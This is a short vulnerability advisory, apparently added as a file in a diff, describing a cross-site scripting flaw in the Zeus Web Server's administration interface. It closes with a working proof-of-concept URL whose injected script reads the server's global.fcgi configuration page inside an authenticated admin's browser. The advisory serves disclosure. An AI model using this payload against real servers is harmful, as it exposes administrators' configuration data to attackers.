@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/7751/info
+
+The Zeus Web Server contains a web based administration interface that is vulnerable to cross site scripting attacks.
+
+Due to insufficient sanitization of user-supplied input, it is possible for an attacker to construct a malicious link which contains arbitrary HTML and script code, which will be executed in the web client of a user who visits the malicious link. It should be noted that the user must authenticate with the administrative interface for the attack to succeed.
+
+The vendor has stated that cookies are not used to store usernames and passwords.
+
+http://<target>:9090/apps/web/vs_diag.cgi?server=<script>function%20pedo()
+{var%20xmlHttp%20=%20new%20ActiveXObject("Microsoft.XMLHTTP");xmlHttp.open
+("GET","http://<target>:9090/apps/web/global.fcgi",false);xmlHttp.send
+();xmlDoc=xmlHttp.responseText;document.write(xmlDoc);}pedo();alert("Have%
+20you%20enabled%20the%20protection%20of%20your%20ZEUS...?%20We%20can%20rip%
+20this%20info!%20Much%20more%20evil%20actions%20are%20possible...")
+</script> 
